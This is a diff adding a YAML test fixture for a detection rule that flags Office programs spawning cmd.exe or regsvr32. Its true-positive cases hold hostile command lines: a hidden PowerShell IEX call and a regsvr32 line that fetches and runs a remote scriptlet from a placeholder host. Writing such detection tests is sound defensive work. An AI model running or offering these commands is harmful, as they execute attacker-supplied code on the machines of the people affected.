@@ -1,0 +1,15 @@
+rule_id: 0e65f9aa-9563-4254-aeac-bc226048b3c6
+true_positives:
+  - ParentImage: 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE'
+    Image: 'C:\Windows\System32\cmd.exe'
+    CommandLine: 'cmd.exe /c powershell -w hidden -c IEX(...)'
+  - ParentImage: 'C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE'
+    Image: 'C:\Windows\System32\regsvr32.exe'
+    CommandLine: 'regsvr32 /s /u /i:http://x/a.sct scrobj.dll'
+true_negatives:
+  - ParentImage: 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE'
+    Image: 'C:\Windows\splwow64.exe'
+    CommandLine: 'splwow64.exe 8192'
+  - ParentImage: 'C:\Windows\explorer.exe'
+    Image: 'C:\Windows\System32\cmd.exe'
+    CommandLine: 'cmd.exe'
